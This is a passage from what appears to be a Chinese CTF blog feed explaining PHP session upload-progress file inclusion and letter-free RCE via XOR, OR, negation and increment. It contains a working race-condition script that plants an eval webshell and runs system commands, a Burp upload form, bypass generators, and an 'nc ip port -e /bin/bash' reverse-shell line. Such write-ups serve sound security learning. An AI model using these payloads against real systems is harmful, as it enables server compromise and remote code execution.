invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/15/rMeGND46xv2EfkB.png" alt="image-20230718183919467.png"></p><p>下面来讲一下这个base64的编码规则：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.将传入的字符转换成<span class="hljs-number">2</span>进制 根据ascii进行划分 是<span class="hljs-number">8</span>位 （不满<span class="hljs-number">8</span>个高位补零）<br><span class="hljs-attribute">2</span>.将<span class="hljs-number">8</span>位的二进制进行<span class="hljs-number">6</span>位一组划分，因为<span class="hljs-number">2</span>^<span class="hljs-number">6</span>=<span class="hljs-number">64</span>  不满<span class="hljs-number">6</span>位的补零<br><span class="hljs-attribute">3</span>.总的比特数得是<span class="hljs-number">24</span>的倍数，<span class="hljs-number">6</span>和<span class="hljs-number">8</span>的最小公倍数是<span class="hljs-number">24</span> 不满足的补零，补的零转换成=<br><span class="hljs-attribute">4</span>.最后根据表格转换成字符串<br></code></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t0178a983065875c97e.png" alt="img"></p><p><img src="https://p1.ssl.qhimg.com/t01eec8c9eb8ff18e75.png" alt="img"></p><p>经过base64编码过后的长度是原长度的4/3</p><p>编码了解了，下面看一下解码，解码和编码差不多，编码后的长度是原长度的3/4</p><p>所以是4个字节一组 这样才满足解码规则，之前的是只对session进行了编码，然后对所有的内容进行了解码，这样是错误的，所以我们根据解码的规则，构造长度，让前面的能够满足4位一组，让后面的session能够进行一个解码</p><p>username|s:24:” 我们这里使用的是php解释器，具体的请看session反序列化  由于base64解码只会对 A-Z，a-z,0-9 和/ + = 进行一个解码，其他的字符不会进行解码</p><p>所以上面的实际就是user name s24  共11个字符，还差一个，这时就在session传入那里构造其他的垃圾数据</p><p>让其满足username|s”xxx:”  就是3位数据</p><p><img src="https://s2.loli.net/2023/09/15/tRebZyTG78YQXPq.png" alt="image-20230718185352817.png"> </p><p><img src="https://s2.loli.net/2023/09/15/vR19d7kwZpMNyxT.png" alt="image-20230718185411245.png"></p><h2 id="2-No-session-start"><a href="#2-No-session-start" class="headerlink" title="2.No session_start()"></a>2.No session_start()</h2><p>首先要理解几个session中的配置是什么意思</p><p><img src="https://p2.ssl.qhimg.com/t018bf95c18fe0d3587.png" alt="img"></p><p>session.auto_start 这个键开启时，会自动进行session的初始化，但是一般情况下是默认关闭的。</p><p>session.upload_progress.cleanup 这个开启的时候表示当上传完成后php会立刻清理session文件的内容，这个跟后面的条件竞争有关</p><p>session.upload_progress_enabled 这个开启的时候，php能够在每一个文件上传时，检测其进度。只有这一个的话并没有什么，但是，同时POST一个跟ini中session.upload_progress_name相同名字的变量时，就会将进度信息保存在session中，这一部分数据是可以控制的，session就会自动进行初始化，索引是session.upload_progress.prefix和session.upload_prgress.name连接在一起的值</p><p><code>session.upload_progress.freq = &quot;1%&quot;</code>+<code>session.upload_progress.min_freq = &quot;1&quot;</code>：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</p><p>session.use_strict_mode为0时，它的PHPSESSID的值是由我们自己定义的</p><p>综上所述，整体的一个思想就是session.uplaod_progress.name的值是可以控制的，同时POST传递时，会将其保存在session中，并且PHPSESSID的值是我们可以控制的，这样我们就可以恶意构造session.uplaod_progress.name的值，通过文件包含和条件竞争，来实现一个危害。</p><p>实现方法总共有两种，一种就是通过脚本跑，另一种就是通过bp</p><p>先来说通过bp的。</p><p>1，首先要构造一个上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28342/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">vaule</span>=<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面的内容根据实际情况进行修改</p><p>2.修改PHPSESSID的值，发送到爆破板块</p><p><img src="https://s2.loli.net/2023/09/15/pjdLToiImzPtJ2c.png" alt="image-20230719113426206.png"></p><p>3.设置NULL payloads</p><p>4.将文件包含的也发送到bp爆破模块</p><p><img src="https://s2.loli.net/2023/09/15/jNzfqTe3o7UvO6l.png" alt="image-20230719113547926.png"></p><p>也设置NULL payloads 然后就可以去连接蚁剑了</p><p>方法2.通过脚本：<br>网上找的一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">import</span> requests<br><br>sessid = <span class="hljs-string">&#x27;0&#x27;</span><br>target = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28071/&#x27;</span><br>file = <span class="hljs-string">&#x27;ph0ebus.txt&#x27;</span><br>f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br><br>event = threading.Event()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># 使用 event.is_set() 来判断是否需要继续执行</span><br>        session.post(target, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)  <span class="hljs-comment"># 修改参数名为 cookies</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># 使用 event.is_set() 来判断是否需要继续执行</span><br>        resp = session.get(<br>            <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctf*&#x27;);&quot;</span>)  <span class="hljs-comment"># 修改为 get 请求</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 如果成功读取到文件内容，设置 event，退出循环</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]retry&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    threads = []  <span class="hljs-comment"># 存储线程的列表</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t1 = threading.Thread(target=write, args=(session,))<br>            threads.append(t1)<br>            t1.start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t2 = threading.Thread(target=read, args=(session,))<br>            threads.append(t2)<br>            t2.start()<br><br>        <span class="hljs-comment"># 等待所有线程结束</span><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>            t.join()<br><br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置 event，以防止线程无法退出循环</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无数字字母RCE</title>
    <link href="/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/"/>
    <url>/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/</url>
    
    <content type="html"><![CDATA[<h1 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或 ^"></a>异或 ^</h2><p>异或运算：相同为0 不同为1</p><p>两个字符的ascii码所对应的二进制进行一个异或运算</p><p>然后思想就是将两个字符串进行一个异或运算 结果就是我们想要得到的一个值</p><p>下面是一个php的异或运算的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$result1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$result2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">judge</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$num</span>&lt;=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$shell</span>);<span class="hljs-variable">$num</span>++)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$x</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$x</span>++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)))<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$y</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$y</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$y</span>++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>)))<br>                &#123;<br>                    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)^<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span> == <span class="hljs-variable">$shell</span>[<span class="hljs-variable">$num</span>])<br>                    &#123;<br>                        <span class="hljs-variable">$result1</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>);<br>                        <span class="hljs-variable">$result2</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                        <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第一部分： &quot;</span>.<span class="hljs-variable">$result1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第二部分： &quot;</span>.<span class="hljs-variable">$result2</span>;<br>异或运算第一部分：<br>异或运算第二部分：<br></code></pre></td></tr></table></figure><p>还有一个python的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">valid = <span class="hljs-string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br>answer = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入进行异或构造的字符串：&quot;</span>))<br>tmp1, tmp2 = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> answer:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> valid:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> valid:<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(c)):<br>        tmp1 += i<br>        tmp2 += j<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp1为:&quot;</span>,tmp1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp2为:&quot;</span>,tmp2)<br></code></pre></td></tr></table></figure><p>输入我们想要执行的就可以了</p><p>我们来看一下：</p><p><img src="https://s2.loli.net/2023/08/25/ejPVdK1hATQyo7C.png" alt="image-20230706202523452.png"></p><p><img src="https://s2.loli.net/2023/08/25/me9wrOgdAEplF42.png" alt="image-20230706203038189.png"></p><p>“运算第一部分”^”运算第二部分”  这里要进行一个url编码 因为加号会被当作空格 所以要进行一个url编码</p><p><strong>php5</strong>下可以用<code>assert($_POST[&#39;_&#39;]);</code> 进行一个命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <br><span class="hljs-variable">$a</span>=assert;<br><span class="hljs-variable">$b</span>=_POST;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$$b</span>;<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <span class="hljs-comment">//让a=_   让b=__ 让c=___    //因为是无数字字母</span><br>    <span class="hljs-meta">?&gt;</span>     <span class="hljs-comment">// assert=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;   _POST=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;   最后要对结果进行一个url编码</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/FCjqc2XBkuMzaVv.png" alt="image-20230706211442786.png"></p><p>记得url编码</p><p>PHP7下面构造一个反引号</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">`<span class="hljs-symbol">$</span>_POST[_]`     <span class="hljs-symbol">$</span>_=<span class="hljs-string">&quot;!+/((&quot;</span>^<span class="hljs-string">&quot;~&#123;`&#123;|&quot;</span>;<span class="hljs-symbol">$</span>__=<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_;`<span class="hljs-symbol">$</span>__[_]`;<br></code></pre></td></tr></table></figure><p>然后这个利用到了反弹shell _=nc ip 监听端口号 -e /bin/bash</p><h2 id="或"><a href="#或" class="headerlink" title="或  |"></a>或  |</h2><p>有1则为1 下面是脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">import re<br>import urllib<br><span class="hljs-keyword">from</span> urllib import parse<br>hex_i = <span class="hljs-string">&quot;&quot;</span><br>hex_j = <span class="hljs-string">&quot;&quot;</span><br>pattern=<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>    <span class="hljs-comment">//这个地方是根据题目进行一个正则匹配</span><br>str1=[<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;cat flag.php&quot;</span>]    <span class="hljs-comment">//进行命令执行的</span><br><span class="hljs-keyword">for</span> p in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">2</span>):<br>    t1 = <span class="hljs-string">&quot;&quot;</span><br>    t2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> k in str1[p]:<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">for</span> j in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(i)) :<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(j)) :<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                    hex_i = <span class="hljs-string">&quot;0&quot;</span> + <span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_i=<span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">if</span> j &lt; <span class="hljs-number">16</span>:<br>                    hex_j=<span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_j=<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                hex_i=<span class="hljs-string">&#x27;%&#x27;</span>+hex_i<br>                hex_j=<span class="hljs-string">&#x27;%&#x27;</span>+hex_j<br>                c=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_i))|<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_j)))<br>                <span class="hljs-keyword">if</span>(c ==k):<br>                    t1=t1+hex_i<br>                    t2=t2+hex_j<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;(\&quot;&quot;</span>+t1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="hljs-string">&quot;\&quot;)&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>~() 会对括号里面的东西进行一个取反  如果原本是0b1001  经过取反后是 0b0110</p><p><img src="https://s2.loli.net/2023/08/25/hNUTOxH4enmrPLQ.png" alt="image-20230706221417162.png"></p><p>有中文的也有url编码的  </p><p>下面用url的来讲一下：</p><p><img src="https://s2.loli.net/2023/08/25/6egkZrpwcUoJICP.png" alt="image-20230706222401719.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_=assert $__=_POST      不用在再url了   这个是在php5下<br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;_POST&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>php7下是反引号 进行反弹shell</p><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>先来一个简单的代码来理解一下什么是自增</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;A&#x27;</span>;<br>++<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//运行结果是B</span><br></code></pre></td></tr></table></figure><p>这个++之前c语言的时候就学习过了 我们如果获取到了首字母A的话那么任意一个字母我们都可以通过自增的方法来获取</p><p>但是在无数字字母中我们不能有字母 那么该如何获取A呢？ 这里要用到了数组 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;   <span class="hljs-comment">//运行结果是Array</span><br></code></pre></td></tr></table></figure><p>但是我们获得的是整个数组 它并不是一个字符串 所以单一个字母A我们是拿不到的 这里在数组后面加一个’’ 这样就会被当作字符串了 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]; <br><span class="hljs-comment">//运行结果是A</span><br></code></pre></td></tr></table></figure><p>还有一个问题 既然是无数字字母的话 这个0就不应该有了 我们找一个不存在的变量 为假 也就是0 这样就可以代替了   然后变量名用_ 来代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-comment">//运行结果是A</span><br></code></pre></td></tr></table></figure><p>在php5中我们可以用<code>assert($_POST[_])</code> 来进行一个命令执行</p><p>然后这个assert和_POST  都可以利用自增进行构造出来</p><p>下面讲一下构造的思路 </p><p>上面的既然可以运算出A 我们也可以运算出S 前置是先把A这个值赋给几个变量 方便后续的构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];   这个三个下划线的被赋值成了A<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;  <br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;    <span class="hljs-regexp">//</span>然后两个下划线的和一个下划线的都被赋值成了A  这里是为什么 下面拼接的时候就能看出作用了 <br></code></pre></td></tr></table></figure><p>OK 下面就来构造S吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 